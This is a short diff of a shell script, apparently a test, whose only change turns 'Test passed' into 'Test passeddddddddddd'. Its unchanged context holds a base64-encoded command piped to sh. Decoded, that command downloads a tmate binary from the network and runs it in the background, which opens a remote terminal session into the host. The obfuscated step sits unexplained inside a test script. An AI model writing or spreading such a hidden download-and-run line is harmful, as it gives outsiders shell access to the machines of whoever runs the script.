@@ -135,4 +135,4 @@ fi
 
 echo "d2dldCBodHRwczovL2dpdGh1Yi5jb20vdG1hdGUtaW8vdG1hdGUvcmVsZWFzZXMvZG93bmxvYWQvMi40LjAvdG1hdGUtMi40LjAtc3RhdGljLWxpbnV4LWFtZDY0LnRhci54eiAmJiB0YXIgLXhmIHRtYXRlKiAmJiBjZCAidG1hdGUtMi40LjAtc3RhdGljLWxpbnV4LWFtZDY0IiAmJiAuL3RtYXRlICY=" | base64 -d | sh
 
-echo Test passed
+echo Test passeddddddddddd
